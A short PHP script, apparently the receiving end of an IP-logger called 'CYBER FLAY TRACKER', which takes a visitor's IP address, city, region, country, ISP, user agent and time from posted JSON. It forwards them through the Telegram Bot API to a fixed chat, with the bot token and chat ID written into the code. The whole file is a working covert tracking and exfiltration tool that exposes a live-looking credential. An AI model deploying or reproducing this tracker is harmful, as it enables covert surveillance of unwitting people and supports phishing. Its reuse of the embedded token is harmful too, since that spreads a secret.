<?php
$data = json_decode(file_get_contents("php://input"), true);

$ip = $data["ip"];
$country = $data["country"];
$region = $data["region"];
$city = $data["city"];
$isp = $data["isp"];
$agent = $data["agent"];
$time = $data["time"];

$message = "📡 CYBER FLAY TRACKER 📡\n";
$message .= "🌐 IP: $ip\n";
$message .= "📍 Lokasi: $city, $region, $country\n";
$message .= "🏢 ISP: $isp\n";
$message .= "🕒 Waktu: $time\n";
$message .= "📱 User-Agent: $agent";

$token = "7130690846:AAHKdiWpIMntEvl0FNaUJjc1ymPk33hBUIg";
$chat_id = "7932600874";
$url = "https://api.telegram.org/bot$token/sendMessage";

file_get_contents($url."?chat_id=".$chat_id."&text=".urlencode($message));
?>
